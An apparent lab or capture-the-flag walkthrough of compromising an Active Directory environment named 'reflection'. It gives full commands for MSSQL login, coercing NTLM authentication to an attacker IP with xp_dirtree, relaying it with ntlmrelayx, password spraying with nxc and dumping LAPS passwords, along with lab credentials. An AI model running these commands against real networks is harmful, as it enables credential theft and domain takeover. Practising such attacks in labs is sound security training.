
# Enumeration
Enumerating the smb shares of machine #3 we find creds:
![](attachment/dbeac13fcd1fe31943a9ea19ba965951.png)

Using these creds to login to mssql on machine #3 we get other creds:
```
mssqlclient.py web_staging:'Washroom510'@10.10.143.69
```
![](attachment/cf755f5d910fbdadd987c03d781f0e7a.png)

Now password spraying we find other accounts with same password:
![](attachment/0d9438268311add55604fcce9e53df54.png)

Now doing NTLM Relay attack we get hash for an account:
```
exec xp_dirtree "\\10.8.1.208\share"
```
![](attachment/abb91feba1b4fb6d581cc3dc1d97f1c2.png)

Now checking if message signing is disabled:
```
nxc smb 10.10.143.69-71 --gen-relay-list relay.txt
```
![](attachment/2ed881e74f10e1daf811394954d5ff26.png)
It is false

So starting an ntlm relay:
```
ntlmrelayx.py -tf targets.txt -socks -smb2support
```

Now we can access shares
```
proxychains smbclient \\\\10.10.197.101\\prod -U REFLECTION/SVC_WEB_STAGING
```

Now get new creds:
![](attachment/0ddd93e15a60baa6e930a017e12c79ce.png)

Now we can check with mssql on the dc:
![](attachment/9ebefc43d402d5d1fce9b6cdb7f9e9f0.png)
We get passwords from the prod database on DC.
![](attachment/8ed3404b3a9796f6e9d3fd4f7359ef5d.png)

Now trying responder:
![](attachment/4697bfdee9d0e3b48f7bf368b19a8c1b.png)
We get another user.
We cant use nlm relaying as it doesnt work

Now password spraying all passwords we have with the users:
```
nxc smb 10.10.197.101-103 -u users.list -p pass.txt --continue-on-success
```

Now we can use bloodhound:
![](attachment/a84d11fc0d9467d12d5e6944297caaf7.png)

But checking MachineAccountQuota:
![](attachment/892c9e4771584bd6f7673f0ad1f8159d.png)

Now we can try to get laps password
```
nxc ldap reflection.vl -u abbie.smith -p CMe1x+nlRaaWEw -M laps
```
![](attachment/c96c8c5a00cd8df7852ffb99e2b24904.png)

With this password we can try to password spray:
```
nxc smb 10.10.197.101-103 -u users.list -p "H447.++h6g5}xi" --local-auth --continue-on-success
```
![](attachment/1f82a9479f91fa5cf535391204d14400.png)

We got the administrator on ms01